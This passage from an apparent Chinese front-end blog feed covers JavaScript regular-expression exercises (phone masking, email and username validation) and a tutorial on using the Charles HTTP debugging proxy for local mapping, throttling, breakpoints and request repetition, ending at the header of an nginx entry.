class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>正则练习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">textarea&#123;</span></span><br><span class="line"><span class="undefined">width: 400px;</span></span><br><span class="line"><span class="undefined">height: 200px; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"1-找首尾相同的单词"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"2-手机号第4位到第七位换成*"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"3-统一空格"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"4-把名字中的,去掉"</span> <span class="attr">onclick</span>=<span class="string">"t4();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"5-把aaabb换成ab"</span> <span class="attr">onclick</span>=<span class="string">"t5();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">           <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\b([\w])[\w]*\1\b/g</span>;<span class="comment">// \1注意引用方式 [\w]任意一个 [\w]*任意多个 找首尾相同的单词</span></span></span><br><span class="line"><span class="undefined">            /**</span></span><br><span class="line"><span class="undefined">             *  *如何引用子表达式所匹配的结果？</span></span><br><span class="line"><span class="undefined">             *</span></span><br><span class="line"><span class="undefined">             * 答： 在表达式内部 反向引用时 \n来匹配第N个子表达式的结果 子表达式当成变量来传递时，$N来匹配第N个子表达式的匹配结果</span></span><br><span class="line"><span class="undefined">             * </span></span><br><span class="line"><span class="undefined">             */</span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/(1(3|5|8|)\d)\d&#123;4&#125;(\d&#123;4&#125;)/</span>;<span class="comment">//字表达式(3|5|8|)  (\d&#123;4&#125;)  &#123;4&#125;代表任意4个  </span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// alert(cv.match(reg));//打印结果18878553070，188，3070</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">'$1****$3'</span>));<span class="comment">//188****4070</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/[ \t\u3000]+/g</span>;<span class="comment">//找空白符  第一个是半角的空格  \s包含所有空白符  \u3000表示 全角空格的16进制Unicode编码</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">','</span>));<span class="comment">//</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t4</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/([\u4E00-\u9FA0]),([\u4E00-\u9FA0])/g</span>;  <span class="comment">// 找中文用Unicode编码表的中文范围</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">','</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t5</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="comment">//;  </span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">','</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-8-例8-常用正则"><a href="#4-8-例8-常用正则" class="headerlink" title="4.8 例8-常用正则"></a>4.8 例8-常用正则</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/GxzNoG" target="_blank" rel="noopener">https://codepen.io/poetries/pen/GxzNoG</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>常用正则解答<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/(\w)\1+/g</span>; <span class="comment">//查找连续多个字符  把aaabbccdd换成abcd这个格式</span></span></span><br><span class="line"><span class="undefined">            /**\1 后向引用，表示表达式中，从左往右数，第一个左括号对应的括号内的内容。</span></span><br><span class="line"><span class="undefined">            以此类推，\2表示第二个，\0表示整个表达式**/</span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">'$1'</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//手机号正则：</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//1开头</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//358第二位</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//后九位</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/1[358]\d&#123;9&#125;/g</span>; <span class="comment">// 这种情况适合在一段文本中分析出手机号</span></span></span><br><span class="line"><span class="javascript">            alert(cv.match(reg));<span class="comment">//分析手机号</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/^1[358]\d&#123;9&#125;$/g</span>;</span></span><br><span class="line"><span class="javascript">            alert(reg.test(cv));<span class="comment">// test 验证手机号</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t4</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/^\s+|\s+$/g</span>; <span class="comment">// | 并列 或者 去除两端空格</span></span></span><br><span class="line"><span class="javascript">            alert(<span class="string">'--'</span>+cv.replace(reg,<span class="string">''</span>)+<span class="string">'--'</span>);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//借助正则限制在一个有限范围内 防止sql注入</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t5</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/^[\w\u4E00-\u9FA0]&#123;4,16&#125;$/</span>; <span class="comment">// \u4E00-\u9FA0 中文对应的Unicode编码 验证由字母数字下划线中文组合的4-16位用户名 </span></span></span><br><span class="line"><span class="undefined">            alert(reg.test(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t6</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/^[0-9a-zA-Z]\w*(\.[\w]+)*@[0-9a-zA-Z\-]+(\.[\w]+)+$/</span>;</span></span><br><span class="line"><span class="undefined">            alert(reg.test(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t7</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="comment">//;</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">''</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"1-替换相同字符串"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"2-分析出手机号"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"3-验证手机号"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"4-去除两端空格"</span> <span class="attr">onclick</span>=<span class="string">"t4();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"5-验证由字母数字下划线中文组合的4-16位用户名"</span> <span class="attr">onclick</span>=<span class="string">"t5();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"6-验证邮箱"</span> <span class="attr">onclick</span>=<span class="string">"t6();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"7-清空script代码"</span> <span class="attr">onclick</span>=<span class="string">"t7();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/JavaScript%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.gif" alt=""></p><h2 id="六、扩展阅读"><a href="#六、扩展阅读" class="headerlink" title="六、扩展阅读"></a>六、扩展阅读</h2><ul><li><a href="http://blog.poetries.top/2016/07/09/%E6%A2%B3%E7%90%86%E5%B8%B8%E7%94%A8%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">梳理常用的正则表达式</a></li><li><a href="http://blog.poetries.top/handbook/">一些总结</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h2&gt;&lt;h3 id=&quot;1-1-正则表达式的web常见场合&quot;&gt;&lt;a href=&quot;#1-1-正则表达式的web常见场合&quot; class=&quot;he
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://blog.poetries.top/tags/JavaScript/"/>
    
      <category term="正则表达式" scheme="http://blog.poetries.top/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>Mac下抓包工具Charles的使用</title>
    <link href="http://blog.poetries.top/2018/03/22/Charles/"/>
    <id>http://blog.poetries.top/2018/03/22/Charles/</id>
    <published>2018-03-22T02:09:43.000Z</published>
    <updated>2018-08-23T01:41:37.463Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>来源于互联网</p></blockquote><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><blockquote><p><code>Charles</code>是目前最强大的<code>http</code>调试工具，在界面和功能上远强于<code>Fiddler</code></p></blockquote><h3 id="1-1-界面功能"><a href="#1-1-界面功能" class="headerlink" title="1.1 界面功能"></a>1.1 界面功能</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-dcb11f65d7bb29fc..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>工具条包含了<code>Charles</code>的大部分功能</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-14cca0970bd19068..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>右键请求出现菜单，Charles的右键菜单功能比fiddler强大太多了</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-99c41c766077fde6..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><ul><li>双击请求进入列表视图，类似fiddler，方便查看和过滤请求</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-d9d6a4fefc75bb73..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>请求详情跟fiddler相似，但直观不少</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-010c9113091479cf..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>工具视图基本讲解完毕，接下来我们用Charles做点事情</p></blockquote><h2 id="二、本地代理和远程代理"><a href="#二、本地代理和远程代理" class="headerlink" title="二、本地代理和远程代理"></a>二、本地代理和远程代理</h2><blockquote><p><code>Charles</code>的代理服务器端口跟<code>fiddler</code>一样都是<code>8888</code>，即你的本机<code>ip:8888</code></p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-15460772ca290ea1..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><ul><li>点击“Map Local”后：</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-3be697ffcf5ae7ad..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p><img src="http://upload-images.jianshu.io/upload_images/1480597-fe78305b4936f75a..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>index-min.js代理成index.js，刷新页面试试。</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-c4874188758f7543..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><ul><li><code>Charles</code>的树状视图比<code>fiddler</code>的列表视图好的地方在于，多次刷新后的请求会被归纳到树里面，更加一目了然，用<code>fiddler</code>的时候，有点强迫症的同学，都要点击<code>clear</code></li><li><code>Charles</code>是支持子目录代理哦，非常实用的功能：(使用通配符<code>*</code>)</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-9755c00d0f287627..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>本地地址选择个子目录，不需要通配符</p></blockquote><p><strong>如何判断是否代理成功呢?</strong></p><ul><li>这点<code>Charles</code>比<code>fiddler</code>人性化多了</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-66b46b491915731d..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>校验是否代理成功，最省力的方式是点击工具条上的刷新按钮，刷新单个请求，如果代理成功，<code>Charles</code>会往“<code>Notes</code>”界面打个<code>log</code>，比如<code>Mapped to local file: C:\www\htdocs\gallery\uploader\1.5\build\index-min.js</code></p></blockquote><p><strong>去除代理配置</strong></p><blockquote><p>小技巧：所有的配置开关都可以通过工具条上的“工具”设置(倒数第二个按钮)</p></blockquote><ul><li>去掉代理配置：</li></ul><blockquote><p>小技巧：建议开启No Caching，不缓存请求</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-5e357738bd0a1a64..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><h2 id="三、mobile代理功能"><a href="#三、mobile代理功能" class="headerlink" title="三、mobile代理功能"></a>三、mobile代理功能</h2><ul><li>手机或平板页面的调试，我们需要把请求代理到<code>pc</code>端的<code>Charles</code>上</li><li>必须确保<code>mobile</code>端和<code>pc</code>端连的是相同的无线网络</li><li>终端获取<code>IP</code> <code>ifconfig</code></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/465386-a00f5967a22675c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt=""></p><h2 id="四、网速模拟功能"><a href="#四、网速模拟功能" class="headerlink" title="四、网速模拟功能"></a>四、网速模拟功能</h2><ul><li><code>throttle</code>功能对于前端来说非常实用，可以看页面在低网速下的表现，从而找出优化的点</li><li>首先先配置下<code>throttle</code></li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-11db08e44b8884aa..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>我们要看页面在3G环境下的表现</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-ac0c7bb62d00b172..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><ul><li><code>Bandwidth</code>(带宽)</li><li><code>Utilistation</code>(利用百分比)</li><li><code>Round-trip</code>(往返延迟)</li><li><code>MTU</code>(字节)</li></ul><h2 id="五、断点功能"><a href="#五、断点功能" class="headerlink" title="五、断点功能"></a>五、断点功能</h2><blockquote><p><code>Charles</code>另一个非常实用的功能，对于开发者和测试人员来说，堪称神器。<code>Charles</code>能够断到发送请求前(篡改<code>Request</code>)和请求后(篡改<code>Response</code>)。</p></blockquote><ul><li>场景：<code>ajax</code>发送请求，我们需要测试接口的各种边界情况，比如出错、超时等表现，<code>Charles</code>的断点+随意篡改，非常方便测试</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-6c39ea05332e991b..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><ul><li><code>upload.php</code>是我们要测试的上传接口，右键选择“<code>BreakPoints</code>”，开启断点</li><li>小技巧：不用在<code>web</code>界面中操作，使用<code>repeat</code>功能，就可再次发送一样的请求：</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-4fb23edb106e60ff..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><h2 id="六、重复发送请求"><a href="#六、重复发送请求" class="headerlink" title="六、重复发送请求"></a>六、重复发送请求</h2><ul><li><code>repeat</code>功能对于测试同学特别有用，可以检验接口的健壮性。</li><li><code>repeat</code>功对于前端的价值是不需要刷新页面，只需要<code>repeat</code>请求，比如检验代理是否成功，修改请求后执行等</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-10932f6745751e3b..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><ul><li>“<code>repeat</code>”重复发送一次请求。</li><li>“<code>repeat Advances</code>”可以自定义重复次数和重复间隔</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-1d2c4f4d9e08ea40..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><h2 id="七、过滤请求"><a href="#七、过滤请求" class="headerlink" title="七、过滤请求"></a>七、过滤请求</h2><blockquote><p>捕获的请求太多，容易产生干扰，<code>Charles</code>可以对捕获记录进行过滤。</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-64bab3a21fafb2b2..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p><img src="http://upload-images.jianshu.io/upload_images/1480597-69831aefa91efa5a..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p><strong>相关文章阅读</strong></p><ul><li><a href="http://blog.poetries.top/2017/11/04/fiddler/">windows下使用Fiddler做抓包分析</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;来源于互联网&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Ch
      
    
    </summary>
    
      <category term="Tools" scheme="http://blog.poetries.top/categories/Tools/"/>
    
    
      <category term="调试" scheme="http://blog.poetries.top/tags/%E8%B0%83%E8%AF%95/"/>
    
      <category term="Charles" scheme="http://blog.poetries.top/tags/Charles/"/>
    
  </entry>
  
  <entry>
    <title>nginx之location的匹配规则</title>
    <link href="http://blog.poetries.top/2018/02/28/nginx-location-match-rules/"/>
    <id>http://blog.poetries.top/2018/02/28/nginx-location-match-rules/</id>
    <published>2018-02-28T05:01:42.000Z</published>
    <updated>2018-08-23T01:41:37.487Z</updated>
    
